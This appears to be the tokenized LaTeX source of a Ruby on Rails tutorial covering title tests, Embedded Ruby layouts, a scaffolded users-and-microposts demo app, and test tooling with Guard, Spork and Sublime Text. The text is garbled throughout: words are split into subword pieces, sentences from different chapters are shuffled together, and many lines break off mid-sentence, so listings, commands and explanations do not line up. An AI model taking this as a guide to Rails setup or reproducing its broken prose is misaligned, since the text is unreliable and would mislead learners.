▁You ▁may ▁have ▁notice d ▁that ▁the ▁\ k ode { rails ▁new } ▁command ▁already ▁created ▁a ▁layout ▁file .
▁We ' ll ▁learn ▁its ▁purpose ▁short ly , ▁but ▁for ▁now ▁you ▁should ▁re name ▁it ▁before ▁proceeding :
▁(\ k ode { m v } ▁is ▁a ▁Unix ▁command ; ▁on ▁Windows ▁you ▁may ▁need ▁to ▁re name ▁the ▁file ▁using ▁the ▁file ▁browser ▁or ▁the ▁\ k ode { re name } ▁command .)
▁in ▁Listing ~\ ref { code : title _ test }.
▁A ▁title ▁test .
▁This ▁uses ▁the ▁\ k ode { ha ve \_ title } ▁method , ▁which ▁check s ▁for ▁an ▁HTML ▁title ▁with ▁the ▁given ▁content .
▁In ▁other ▁words , ▁the ▁code
▁check s ▁to ▁see ▁that ▁the ▁content ▁inside ▁the ▁\ k ode { title } ▁tag ▁is
▁It ' s ▁worth ▁ ment ion ing ▁that ▁the ▁content ▁need ▁not ▁be ▁an ▁exact ▁match ; ▁any ▁sub string ▁works ▁as ▁well , ▁so ▁that
▁will ▁also ▁match ▁the ▁full ▁title .
▁The ▁StaticPages ▁controller ▁spec ▁with ▁title ▁tests .
▁to ▁verify ▁that ▁our ▁code ▁is ▁now ▁Re d ▁( failing ▁tests ).
▁Now ▁we ' ll ▁get ▁our ▁title ▁tests ▁to ▁pass , ▁and ▁at ▁the ▁same ▁time ▁add ▁the ▁full ▁HTML ▁structure ▁needed ▁to ▁make ▁valid ▁web ▁pages .
▁The ▁markup ▁for ▁a ▁mode r n ▁web ▁page ▁follows ▁this ▁form :
▁The ▁ extremely ▁simple ▁ doc type ▁\ k ode { < ! D O C TYPE ▁ html > } ▁is ▁character ist ic ▁of ▁the ▁latest ▁HTML ▁standard , ▁HTML 5 .
▁As ▁a ▁result , ▁the ▁tests ▁for ▁the ▁Home ▁page ▁should ▁now ▁pass .
▁G re en
▁in ▁Listing ~\ ref { code : help _ view _ full _ html } ▁and
▁is ▁a ▁project ▁to ▁make ▁a ▁book ▁and ▁screencasts ▁to ▁teach ▁web ▁development
▁< n > ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁This ▁repeated ▁code ▁is ▁a ▁violat ion ▁of ▁the ▁important ▁`` Do n ' t ▁R epeat ▁Your self '' ▁( DRY ) ▁principle ; ▁in ▁this ▁section ▁and ▁the ▁next ▁we ' ll ▁`` DRY ▁out ▁our ▁code '' ▁by ▁remov ing ▁the ▁repetition .
▁The ▁technique ▁involve s ▁using ▁\ emph { Embedded ▁Ruby } ▁in ▁our ▁views .
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁an ▁ Embedded ▁Ruby ▁title .
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁an ▁ Embedded ▁Ruby ▁title .
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁an ▁ Embedded ▁Ruby ▁title .
▁In ▁other ▁words , ▁\ emph { all } ▁our ▁pages ▁are ▁identical ▁in ▁structure , ▁including ▁the ▁contents ▁of ▁the ▁title ▁tag , ▁with ▁the ▁so le ▁exception ▁of ▁the ▁material ▁inside ▁the ▁\ k ode { body } ▁tag .
▁To ▁get ▁the ▁layout ▁to ▁work , ▁we ▁have ▁to ▁replace ▁the ▁default ▁title ▁with ▁the ▁ Embedded ▁Ruby ▁from ▁the ▁examples ▁above :
▁In ▁this ▁chapter , ▁we ' ll ▁develop ▁a ▁simple ▁ demo n str ation ▁application ▁to ▁show ▁off ▁some ▁of ▁the ▁power ▁of ▁Rails .
▁The ▁purpose ▁is ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁Ruby ▁on ▁Rails ▁programming ▁( and ▁web ▁development ▁in ▁general ) ▁by ▁ r api d ly ▁ generating ▁an ▁application ▁using ▁\ emph { scaffold ▁generator s }.
▁Verify ing ▁that ▁the ▁test ▁suite ▁ still ▁passes ▁gives ▁us ▁confidence ▁that ▁this ▁code ▁refactoring ▁was ▁successful :
▁The ▁result ing ▁ demo ▁app ▁will ▁allow ▁us ▁to ▁interact ▁with ▁it ▁through ▁its ▁URLs , ▁giv ing ▁us ▁in s ight ▁into ▁the ▁structure ▁of ▁a ▁Rails ▁application , ▁including ▁a ▁first ▁example ▁of ▁the ▁\ emph { REST ▁architecture } ▁favor ed ▁by ▁Rails .
▁As ▁with ▁the ▁for th com ing ▁sample ▁application , ▁the ▁ demo ▁app ▁will ▁consist ▁of ▁\ emph { users } ▁and ▁their ▁ associated ▁\ emph { microposts } ▁( th us ▁ const it u ting ▁a ▁minimal ist ▁Twitter - style ▁app ).
▁Before ▁mov ing ▁on , ▁let ' s ▁take ▁a ▁ minute ▁to ▁commit ▁our ▁changes ▁and ▁merge ▁them ▁into ▁the ▁master ▁branch .
▁In ▁this ▁section , ▁we ' ll ▁out line ▁our ▁plan s ▁for ▁the ▁ demo ▁application .
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁ demo ▁app .
▁If ▁you ▁like , ▁at ▁this ▁point ▁you ▁can ▁even ▁deploy ▁the ▁updated ▁application ▁to ▁Heroku :
▁( Re c all ▁that ▁if ▁Bundler ▁complain s ▁about ▁a ▁\ text tt { read line } ▁error , ▁try ▁adding ▁\ k ode { gem ▁' rb - read line ' } ▁to ▁your ▁\ k ode { Gemfile }. )
▁F inally , ▁we ' ll ▁put ▁the ▁ demo ▁app ▁under ▁version ▁control .
▁from ▁Listing ~\ ref { code : gitignore } ▁to
▁Then ▁initialize ▁a ▁Git ▁repository ▁and ▁make ▁the ▁first ▁commit :
▁Creat ing ▁a ▁ demo ▁app ▁repository ▁at ▁GitHub . ~\ href { http :// railstutorial . org / images / figures / create _ demo _ repo _4_0 - full . png }{ ( full ▁size )}
▁The ▁StaticPages ▁controller ▁spec ▁with ▁a ▁base ▁title .
▁( As ▁with ▁the ▁first ▁app , ▁take ▁care ▁\ emph { not } ▁to ▁initialize ▁the ▁GitHub ▁repository ▁with ▁a ▁\ k ode { README } ▁file .)
▁In ▁our ▁case , ▁the ▁ demo ▁app ▁will ▁be ▁a ▁microblog , ▁with ▁only ▁users ▁and ▁short ▁( micro ) post s .
▁Users ▁of ▁our ▁ demo ▁app ▁will ▁have ▁a ▁unique ▁\ k ode { integer } ▁identifier ▁called ▁\ k ode { id }, ▁a ▁public ly ▁view able ▁\ k ode { name } ▁( of ▁type ▁\ k ode { string }), ▁and ▁an ▁\ k ode { email } ▁address ▁( also ▁a ▁\ k ode { string }) ▁that ▁will ▁double ▁as ▁a ▁username .
▁The ▁\ k ode { Gemfile } ▁needed ▁to ▁use ▁PostgreSQL ▁instead ▁of ▁SQLite .
▁The ▁core ▁of ▁the ▁micropost ▁data ▁model ▁is ▁even ▁simple r ▁than ▁the ▁one ▁for ▁users : ▁a ▁micropost ▁has ▁only ▁an ▁\ k ode { id } ▁and ▁a ▁\ k ode { content } ▁field ▁for ▁the ▁micropost ' s ▁text ▁( of ▁type ▁\ k ode { string })
▁F inally , ▁we ' ll ▁ ment ion ▁a ▁method ▁for ▁running ▁tests ▁directly ▁inside ▁S ublime ▁Text , ▁a ▁technique ▁es pecially ▁useful ▁when ▁used ▁in ▁con c er t ▁with ▁Spork .
▁When ▁model ing ▁longer ▁posts , ▁such ▁as ▁those ▁for ▁a ▁normal ▁( n on - micro ) ▁blog , ▁you ▁should ▁use ▁the ▁\ k ode { text } ▁type ▁in ▁place ▁of ▁\ k ode { string }.
▁This ▁section ▁should ▁only ▁be ▁attempt ed ▁by ▁fai r ly ▁advanced ▁users ▁and ▁can ▁be ▁skip ped ▁without ▁ lo s s ▁of ▁continu ity .
▁There ' s ▁an ▁ additional ▁com plication , ▁though : ▁we ▁want ▁to ▁\ emph { associate } ▁each ▁micropost ▁with ▁a ▁particular ▁user ; ▁we ' ll ▁accomplish ▁this ▁by ▁record ing ▁the ▁\ k ode { user \_ id } ▁of ▁the ▁own er ▁of ▁the ▁post .
▁A mong ▁other ▁things , ▁this ▁material ▁is ▁likely ▁to ▁go ▁out ▁of ▁date ▁faster ▁than ▁the ▁rest ▁of ▁the ▁tutorial , ▁so ▁you ▁should n ' t ▁expect ▁everything ▁on ▁your ▁system ▁to ▁match ▁the ▁examples ▁exactly , ▁and ▁you ▁may ▁have ▁to ▁Google ▁around ▁to ▁get ▁everything ▁to ▁work .
▁( For ▁technical ▁reason s , ▁the ▁only ▁exception ▁to ▁this ▁is ▁the ▁\ k ode { rails } ▁command ▁itself .)
▁This ▁practice ▁is ▁rather ▁cumbersome , ▁and ▁in ▁this ▁section ▁we ▁discuss ▁two ▁ways ▁to ▁eliminate ▁its ▁ n ec es s ity .
▁RVM ▁Bundler ▁integration
▁The ▁first ▁and ▁preferred ▁method ▁is ▁to ▁use ▁RVM , ▁which ▁includes ▁Bundler ▁integration ▁as ▁of ▁version ▁1. 11 .
▁You ▁can ▁verify ▁that ▁you ▁have ▁a ▁ s u ff ic i ent ly ▁up - to - date ▁version ▁of ▁RVM ▁as ▁follows :
▁As ▁long ▁as ▁the ▁version ▁number ▁is ▁1. 11 . x ▁or ▁greater , ▁installed ▁gems ▁will ▁automatically ▁be ▁executed ▁in ▁the ▁proper ▁Bundler ▁environment , ▁so ▁that ▁you ▁can ▁write ▁( for ▁example )
▁and ▁omit ▁the ▁leading ▁\ k ode { bundle ▁exec }.
▁If ▁this ▁is ▁the ▁case , ▁you ▁should ▁skip ▁the ▁rest ▁of ▁this ▁section .
▁The ▁steps ▁are ▁simple ▁if ▁some what ▁mysterious .
▁First , ▁run ▁these ▁two ▁commands :
▁Then ▁run ▁these :
▁create ▁db / migrate / 20 1 3 0 3 0 5 22 17 1 4 _ create _ users . rb
▁To get h er , ▁these ▁commands ▁combine ▁RVM ▁and ▁Bundler ▁magic ▁to ▁ensure ▁that ▁commands ▁such ▁as ▁\ k ode { rake } ▁and ▁\ k ode { rspec } ▁are ▁automatically ▁executed ▁in ▁the ▁right ▁environment .
▁ Adding ▁\ k ode { bundle r \_ stub s } ▁to ▁the ▁\ k ode { . gitignore } ▁file .
▁invoke ▁ j builder _ scaffold _ controller
▁bundle r _ stub s /
▁The ▁same ▁go es ▁for ▁\ k ode { rake }, ▁etc . :
▁For ▁the ▁ s a k e ▁of ▁readers ▁who ▁skip ▁this ▁section , ▁the ▁rest ▁of ▁this ▁tutorial ▁will ▁ er r ▁on ▁the ▁side ▁of ▁caution ▁and ▁explicitly ▁use ▁\ k ode { bundle ▁exec }, ▁but ▁of ▁course ▁you ▁should ▁feel ▁free ▁to ▁use ▁the ▁more ▁compact ▁version ▁if ▁your ▁system ▁is ▁properly ▁configured .
▁bin stub s
▁One ▁an no y ance ▁ associated ▁with ▁using ▁the ▁\ k ode { rspec } ▁command ▁is ▁ having ▁to ▁switch ▁to ▁the ▁command ▁line ▁and ▁run ▁the ▁tests ▁by ▁hand .
▁In ▁this ▁section , ▁we ' ll ▁show ▁how ▁to ▁use ▁\ href { https :// github . com / guard / guard }{ G u ar d } ▁to ▁automate ▁the ▁running ▁of ▁the ▁tests .
▁Guard ▁m on it or s ▁changes ▁in ▁the ▁file system ▁so ▁that , ▁for ▁example , ▁when ▁we ▁change ▁the ▁\ k ode { static \_ pages \_ spec . rb } ▁file ▁only ▁those ▁tests ▁get ▁run .
▁Even ▁better , ▁we ▁can ▁configure ▁Guard ▁so ▁that ▁when , ▁say , ▁the ▁\ k ode { home . html . erb } ▁file ▁is ▁modified , ▁the ▁\ k ode { static \_ pages \_ spec . rb } ▁automatically ▁run s .
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁app , ▁including ▁Guard .
▁# ▁Un comment ▁this ▁line ▁on ▁OS ▁ X .
▁exist ▁app / views / users
▁# ▁gem ▁' g row l ' , ▁' 1 . 0 . 3 '
▁# ▁Un comment ▁these ▁lines ▁on ▁L in u x .
▁# ▁gem ▁' lib not ify ' , ▁' 0 . 8 . 0 '
▁# ▁Un comment ▁these ▁lines ▁on ▁Windows .
▁# ▁gem ▁' rb - not if u ' , ▁' 0 . 0 . 4 '
▁Be ▁sure ▁to ▁uncomment ▁the ▁lines ▁in ▁the ▁test ▁group ▁relevant ▁for ▁your ▁system .
▁( Note ▁that , ▁if ▁you ▁want ▁G row l ▁ notifications , ▁you ▁will ▁have ▁to ▁purchas e ▁\ href { http :// g row l . info / download s }{ G row l }, ▁which ▁is ▁available ▁in ▁the ▁App le ▁App ▁ Store ▁for ▁a ▁no m in al ▁charge .)
▁We ▁next ▁install ▁the ▁gems ▁by ▁running ▁\ k ode { bundle ▁install } :
▁Then ▁initialize ▁Guard ▁so ▁that ▁it ▁works ▁with ▁RSpec :
▁Writ ing ▁new ▁ Guardfile ▁to ▁/ Users / mhartl / rails _ projects / sample _ app / Guardfile
▁ rspec ▁ guard ▁added ▁to ▁ Guardfile , ▁feel ▁free ▁to ▁edit ▁it
▁Add it ion s ▁to ▁the ▁default ▁\ k ode { Guardfile }.
▁Note ▁the ▁added ▁\ k ode { require }.
▁# ▁C us to m ▁Rails ▁Tutorial ▁spec s
▁" spec / request s / authentication _ pages _ spec . rb "
▁With ▁that , ▁we ▁can ▁run ▁the ▁local ▁web ▁server ▁using ▁\ k ode { rails ▁ s }, ▁which ▁is ▁a ▁shortcut ▁for ▁\ k ode { rails ▁server } :
▁ensure s ▁that ▁Guard ▁does n ' t ▁run ▁all ▁the ▁tests ▁after ▁a ▁failing ▁test ▁passes ▁( to ▁speed ▁up ▁the ▁Re d - G re en - Re factor ▁cycle ).
▁Now ▁the ▁ demo ▁application ▁should ▁be ▁ready ▁to ▁go ▁at ▁\ href { http :// localhost :3000/ }{ http :// localhost :3000/ }.
▁We ▁can ▁now ▁start ▁\ k ode { guard } ▁as ▁follows :
▁By ▁the ▁way , ▁if ▁you ▁get ▁a ▁Guard ▁error ▁complain ing ▁about ▁the ▁absence ▁of ▁a ▁\ k ode { spec / routing } ▁directory , ▁you ▁can ▁fix ▁it ▁by ▁creating ▁an ▁empty ▁one :
▁When ▁running ▁\ k ode { bundle ▁exec ▁ rspec }, ▁you ▁may ▁have ▁notice d ▁that ▁it ▁take s ▁sever al ▁second s ▁just ▁to ▁start ▁running ▁the ▁tests , ▁but ▁once ▁they ▁start ▁running ▁they ▁finish ▁quickly .
▁This ▁is ▁because ▁each ▁time ▁RSpec ▁run s ▁the ▁tests ▁it ▁has ▁to ▁reload ▁the ▁entire ▁Rails ▁environment .
▁A ▁\ emph { s p or k } ▁is ▁a ▁combination ▁sp oo n - for k .
▁The ▁project ' s ▁name ▁is ▁a ▁p un ▁on ▁Spork ' s ▁use ▁of ▁\ href { http :// en . wiki p edia . org / wiki / P O S I X }{ P O S I X } ▁\ href { http :// en . wiki p edia . org / wiki / For k _ ( s of t w a re _ development )} { for k s }.
▁Spork ▁load s ▁the ▁environment ▁\ emph { on ce }, ▁and ▁the n ▁maintain s ▁a ▁p o ol ▁of ▁process es ▁for ▁running ▁future ▁tests .
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁app , ▁including ▁Spork .
▁Then ▁install ▁Spork ▁using ▁\ k ode { bundle ▁install } :
▁Next , ▁ bootstrap ▁the ▁Spork ▁configuration :
▁ Adding ▁environment ▁load ing ▁to ▁the ▁\ k ode { S p or k . pre for k } ▁block .
▁# ▁ Requir es ▁support ing ▁ ruby ▁files ▁with ▁custom ▁match ers ▁and ▁macro s , ▁etc ,
▁# ▁in ▁spec / support / ▁and ▁its ▁subdirectories .
▁# ▁Check s ▁for ▁ pending ▁migrations ▁before ▁tests ▁are ▁run .
▁# ▁If ▁you ▁are ▁not ▁using ▁ActiveRecord , ▁you ▁can ▁remove ▁this ▁line .
▁# ▁# # ▁Mo c k ▁ Frame work
▁# ▁If ▁you ▁prefer ▁to ▁use ▁m o cha , ▁f le x m o c k ▁or ▁R R , ▁uncomment ▁the ▁appropriate ▁line :
▁# ▁config . m o c k _ with ▁: m o cha
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http :// localhost :3000/ users }{/ users }). ~\ href { http :// railstutorial . org / images / figures / demo _ blank _ user _ index _ rails _ 3- full . png }{ ( full ▁size )}
▁# ▁config . m o c k _ with ▁: f le x m o c k
▁# ▁config . m o c k _ with ▁: r r
▁# ▁Re m o ve ▁this ▁line ▁if ▁you ' re ▁not ▁using ▁ActiveRecord ▁or ▁ActiveRecord ▁fixtures
▁The ▁new ▁user ▁page ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }). ~\ href { http :// railstutorial . org / images / figures / demo _ new _ user _ rails _ 3- full . png }{ ( full ▁size )}
▁# ▁If ▁you ' re ▁not ▁using ▁ActiveRecord , ▁or ▁you ' d ▁prefer ▁not ▁to ▁run ▁each ▁of ▁your
▁# ▁examples ▁within ▁a ▁ transaction , ▁remove ▁the ▁following ▁line ▁or ▁assign ▁false
▁# ▁instead ▁of ▁true .
▁# ▁If ▁true , ▁the ▁base ▁class ▁of ▁ anonymous ▁controllers ▁will ▁be ▁inferred
▁# ▁automatically .
▁This ▁will ▁be ▁the ▁default ▁behavior ▁in ▁future ▁versions ▁of
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http :// localhost :3000/ users /1}{ / users /1 }). ~\ href { http :// railstutorial . org / images / figures / demo _ show _ user _ rails _ 3- full . png }{ ( full ▁size )}
▁# ▁ rspec - rails .
▁# ▁Run ▁spec s ▁in ▁random ▁order ▁to ▁ s ur fa ce ▁order ▁dependencies .
▁If ▁you ▁find ▁an
▁The ▁user ▁edit ▁page ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }). ~\ href { http :// railstutorial . org / images / figures / demo _ edit _ user _ rails _ 3- full . png }{ ( full ▁size )}
▁# ▁order ▁ dependency ▁and ▁want ▁to ▁debug ▁it , ▁you ▁can ▁fix ▁the ▁order ▁by ▁providing
▁A ▁user ▁with ▁updated ▁information . ~\ href { http :// railstutorial . org / images / figures / demo _ update _ user _ rails _ 3- full . png }{ ( full ▁size )}
▁# ▁the ▁see d , ▁which ▁is ▁ print ed ▁after ▁each ▁run .
▁# ▁-- seed ▁123 4
▁The ▁user ▁index ▁page ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁with ▁a ▁second ▁user . ~\ href { http :// railstutorial . org / images / figures / demo _ user _ index _ two _ rails _ 3- full . png }{ ( full ▁size )}
▁# ▁This ▁code ▁will ▁be ▁run ▁each ▁time ▁you ▁run ▁your ▁spec s .
▁Having ▁show n ▁how ▁to ▁create , ▁show , ▁and ▁edit ▁users , ▁we ▁come ▁finally ▁to ▁destroying ▁them ▁( F igure ~\ ref { fig : demo _ destroy _ user _ rails _3} ).
▁Before ▁running ▁Spork , ▁we ▁can ▁get ▁a ▁base line ▁for ▁the ▁testing ▁overhead ▁by ▁ti m ing ▁our ▁test ▁suite ▁as ▁follows :
▁You ▁should ▁verify ▁that ▁click ing ▁on ▁the ▁link ▁in ▁F igure ~\ ref { fig : demo _ destroy _ user _ rails _3} ▁destroy s ▁the ▁second ▁user , ▁yield ing ▁an ▁index ▁page ▁with ▁only ▁one ▁user .
▁6 ▁examples , ▁0 ▁failure s
▁real 	 0 m 8 . 6 3 3 s
▁Section ~\ ref { sec : destroy ing _ users } ▁add s ▁user ▁deletion ▁to ▁the ▁sample ▁app , ▁tak ing ▁care ▁to ▁restrict ▁its ▁use ▁to ▁a ▁special ▁class ▁of ▁ administrative ▁users .
▁user 	 0 m 7 . 2 4 0 s
▁ Destroy ing ▁a ▁user . ~\ href { http :// railstutorial . org / images / figures / demo _ destroy _ user _ rails _ 3- full . png }{ ( full ▁size )}
▁ s y s 	 0 m 1 . 0 68 s
▁Here ▁the ▁test ▁suite ▁take s ▁more ▁than ▁ s even ▁second s ▁to ▁run ▁even ▁though ▁the ▁actual ▁tests ▁run ▁in ▁under ▁a ▁te n th ▁of ▁a ▁second .
▁To ▁speed ▁this ▁up , ▁we ▁can ▁open ▁a ▁d ed icated ▁terminal ▁window , ▁navigate ▁to ▁the ▁application ▁root ▁directory , ▁and ▁the n ▁start ▁a ▁Spork ▁server :
▁A ▁ detailed ▁diagram ▁of ▁MVC ▁in ▁Rails . ~\ href { http :// railstutorial . org / images / figures / mvc _ detailed - full . png }{ ( full ▁size )}
▁Using ▁RSpec
▁Load ing ▁Spork . pre for k ▁block . . .
▁Spork ▁is ▁ready ▁and ▁list en ing ▁on ▁ 89 89 !
▁real 	 0 m 2 . 64 9 s
▁user 	 0 m 1 . 2 59 s
▁ s y s 	 0 m 0 . 2 58 s
▁as ▁show n ▁in ▁Listing ~\ ref { code : rspec _ d rb }.
▁Configur ing ▁RSpec ▁to ▁automatically ▁use ▁Spork .
▁One ▁word ▁of ▁a d v ic e ▁when ▁using ▁Spork : ▁after ▁changing ▁a ▁file ▁included ▁in ▁the ▁pre for k ▁load ing ▁( such ▁as ▁\ k ode { routes . rb }), ▁you ▁will ▁have ▁to ▁restart ▁the ▁Spork ▁server ▁to ▁load ▁the ▁new ▁Rails ▁environment .
▁If ▁your ▁tests ▁are ▁failing ▁when ▁you ▁think ▁they ▁should ▁be ▁passing , ▁ quit ▁the ▁Spork ▁server ▁with ▁\ text tt { Ctrl - C } ▁and ▁restart ▁it :
▁Note ▁the ▁notation ▁\ k ode { class ▁ UsersController ▁< ▁Application Controller } ; ▁this ▁is ▁an ▁example ▁of ▁a ▁Ruby ▁\ emph { class } ▁with ▁\ emph { inheritance }.
▁Guard ▁with ▁Spork
▁Spork ▁is ▁es pecially ▁useful ▁when ▁used ▁with ▁Guard , ▁which ▁we ▁can ▁arrange ▁as ▁follows :
▁in ▁Listing ~\ ref { code : s p or k _ guard file }.
▁The ▁\ k ode { Guardfile } ▁updated ▁for ▁Spork .
▁With ▁that ▁configuration ▁in ▁place , ▁we ▁can ▁start ▁Guard ▁and ▁Spork ▁at ▁the ▁same ▁time ▁with ▁the ▁\ k ode { guard } ▁command :
▁Guard ▁automatically ▁start s ▁a ▁Spork ▁server , ▁d ra ma tic ally ▁re d u c ing ▁the ▁overhead ▁each ▁time ▁a ▁test ▁get s ▁run .
▁A ▁well - config ur ed ▁testing ▁environment ▁with ▁Guard , ▁Spork , ▁and ▁( option ally ) ▁test ▁ notifications ▁make s ▁test - driven ▁development ▁p o s i tive ly ▁add ic tive .
▁If ▁you ' re ▁using ▁S ublime ▁Text , ▁there ▁is ▁a ▁powerful ▁set ▁of ▁helper ▁commands ▁to ▁run ▁tests ▁directly ▁inside ▁the ▁editor .
▁This ▁is ▁current ly ▁my ▁preferred ▁setup , ▁as ▁it ▁works ▁great ▁when ▁you ▁only ▁have ▁a ▁few ▁tests ▁while ▁ still ▁scaling ▁nicely ▁even ▁to ▁very ▁large ▁( and ▁therefore ▁long - running ) ▁test ▁suite s .
▁You ▁may ▁also ▁want ▁to ▁follow ▁the ▁setup ▁instructions ▁for ▁\ href { https :// github . com / mhartl / rails _ tutorial _ s ublime _ text }{ Rails ▁Tutorial ▁S ublime ▁Text } ▁at ▁this ▁time
▁After ▁restart ing ▁S ublime ▁Text , ▁the ▁Ruby Test ▁package ▁ s up p li es ▁the ▁following ▁commands :
▁Because ▁test ▁suite s ▁can ▁become ▁quite ▁ s low ▁even ▁for ▁relative ly ▁small ▁project s , ▁being ▁able ▁to ▁run ▁one ▁test ▁( or ▁a ▁small ▁group ▁of ▁tests ) ▁at ▁a ▁time ▁can ▁be ▁a ▁ huge ▁ w in .
▁Even ▁a ▁single ▁test ▁requires ▁the ▁same ▁Rails ▁environment ▁overhead , ▁of ▁course , ▁which ▁is ▁why ▁these ▁commands ▁are ▁ perfect ly ▁complement ed ▁by ▁Spork : ▁running ▁a ▁single ▁test ▁eliminate s ▁the ▁overhead ▁of ▁running ▁the ▁entire ▁test ▁file , ▁while ▁running ▁Spork ▁eliminate s ▁the ▁overhead ▁of ▁starting ▁the ▁test ▁environment .
▁Here ▁is ▁the ▁sequence ▁I ▁recommend :
▁Start ▁Spork ▁in ▁a ▁terminal ▁window .
▁Writ e ▁a ▁single ▁test ▁or ▁small ▁group ▁of ▁tests .
▁Run ▁Co m m and - S h if t - R ▁to ▁verify ▁that ▁the ▁test ▁or ▁test ▁group ▁is ▁re d .
▁Writ e ▁the ▁corresponding ▁application ▁code .
▁Run ▁Co m m and - S h if t - E ▁to ▁run ▁the ▁same ▁test / group ▁again , ▁verify ing ▁that ▁it ' s ▁green .
▁R epeat ▁steps ▁2 - - 5 ▁as ▁necessary .
▁When ▁reach ing ▁a ▁natural ▁stop p ing ▁point ▁( such ▁as ▁before ▁a ▁commit ), ▁run ▁\ k ode { rspec ▁spec / } ▁at ▁the ▁command ▁line ▁to ▁confirm ▁that ▁the ▁entire ▁test ▁suite ▁is ▁ still ▁green .
▁Even ▁with ▁the ▁ability ▁to ▁run ▁tests ▁inside ▁of ▁S ublime ▁Text , ▁I ▁ still ▁some times ▁prefer ▁using ▁Guard , ▁but ▁at ▁this ▁point ▁my ▁b read - and - but ter ▁ TDD ▁technique ▁is ▁the ▁one ▁ enumerate d ▁above .
▁These ▁actions ▁don ' t ▁typical ly ▁render ▁pages ▁( a lthough ▁they ▁some times ▁do ) ; ▁instead , ▁their ▁main ▁purpose ▁is ▁to ▁modify ▁information ▁about ▁users ▁in ▁the ▁database .
▁We ' ll ▁learn ▁more ▁about ▁HTTP ▁request ▁methods ▁starting ▁in ▁Section ~\ ref { sec : TDD }.
▁A lthough ▁REST ▁the or y ▁is ▁rather ▁abstract , ▁in ▁the ▁context ▁of ▁Rails ▁applications ▁REST ▁means ▁that ▁most ▁application ▁components ▁( such ▁as ▁users ▁and ▁microposts ) ▁are ▁model ed ▁as ▁\ emph { resources } ▁that ▁can ▁be ▁created , ▁read , ▁updated , ▁and ▁deleted --- o p er ation s ▁that ▁correspond ▁both ▁to ▁the ▁\ href { http :// en . wiki p edia . org / wiki / Create , _ read , _ update _ and _ delete }{ C R U D ▁operations ▁of ▁relation al ▁database s } ▁and ▁four ▁f un d a ment al ▁\ href { http :// en . wiki p edia . org / wiki / HTTP _ request # Request _ methods }{ HTTP ▁request ▁methods } : ▁\ text tt { POST }, ▁\ text tt { GET }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE }. ▁(
▁The ▁ simplified ▁user ▁\ k ode { index } ▁action ▁for ▁the ▁ demo ▁application .
▁This ▁\ k ode { index } ▁action ▁has ▁the ▁line ▁\ k ode {@ users ▁= ▁User . all } ▁( Step ~3 ), ▁which ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁a ▁list ▁of ▁all ▁the ▁users ▁from ▁the ▁database ▁( Step ~ 4 ), ▁and ▁the n ▁place s ▁them ▁in ▁the ▁variable ▁\ k ode {@ users } ▁( pronoun c ed ▁`` at - users '') ▁( Step ~ 5 ).
▁The ▁User ▁model ▁for ▁the ▁ demo ▁application .
▁This ▁is n ' t ▁technical ly ▁true --- the ▁scaffolding ▁includes ▁ r udi ment ary ▁tests --- but ▁the ▁generated ▁tests ▁are ▁ugly ▁and ▁in f le x i b le , ▁and ▁they ▁don ' t ▁test ▁for ▁data ▁validation , ▁authentication , ▁or ▁any ▁other ▁custom ▁requirements .
▁The ▁RESTful ▁structure ▁of ▁Rails ▁applications ▁is ▁best ▁a b so rb ed ▁by ▁this ▁sort ▁of ▁repetition ▁of ▁form ; ▁in de ed , ▁see ing ▁the ▁parallel ▁structure ▁of ▁Users ▁and ▁Microposts ▁even ▁at ▁this ▁ early ▁stage ▁is ▁one ▁of ▁the ▁p r i me ▁ motivation s ▁for ▁this ▁chapter .
▁ $ ▁rails ▁generate ▁scaffold ▁Micropost ▁content : string ▁user _ id : integer
▁create ▁db / migrate / 20 1 3 0 3 07 00 5 5 28 _ create _ microposts . rb
▁exist ▁app / views / microposts
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ new _ micropost _ rails _3} .
▁The ▁new ▁micropost ▁page ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }). ~\ href { http :// railstutorial . org / images / figures / demo _ new _ micropost - full . png }{ ( full ▁size )}
▁The ▁result ▁should ▁look ▁something ▁like ▁F igure ~\ ref { fig : demo _ micropost _ index _ rails _3} .
▁The ▁micropost ▁index ▁page ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }). ~\ href { http :// railstutorial . org / images / figures / demo _ micropost _ index _ rails _ 3- full . png }{ ( full ▁size )}
▁As ▁seen ▁in ▁F igure ~\ ref { fig : micropost _ length _ error _ rails _3} , ▁Rails ▁render s ▁\ emph { error ▁messages } ▁indicat ing ▁that ▁the ▁micropost ' s ▁content ▁is ▁too ▁long .
▁ Error ▁messages ▁for ▁a ▁failed ▁micropost ▁creation . ~\ href { http :// railstutorial . org / images / figures / micropost _ length _ error _ rails _ 3- full . png }{ ( full ▁size )}
▁ "2013-0 3- 06 ▁ 02 : 37 : 37 ", ▁updated _ at : ▁ "2013-0 3- 06 ▁ 02 : 37 : 37 "> , ▁#< Micropost ▁id : ▁2,
▁( I ▁include ▁the ▁last ▁line ▁just ▁to ▁demonstrate ▁how ▁to ▁exit ▁the ▁console , ▁and ▁on ▁most ▁systems ▁you ▁can ▁ Ctrl - d ▁for ▁the ▁same ▁purpose .)
▁Here ▁we ▁have ▁access ed ▁the ▁user ' s ▁microposts ▁using ▁the ▁code ▁\ k ode { first \_ user . microposts } : ▁with ▁this ▁code , ▁Active ▁Record ▁automatically ▁returns ▁all ▁the ▁microposts ▁with ▁\ k ode { user \_ id } ▁equal ▁to ▁the ▁id ▁of ▁\ k ode { first \_ user } ▁( in ▁this ▁case , ~\ k ode {1} ).
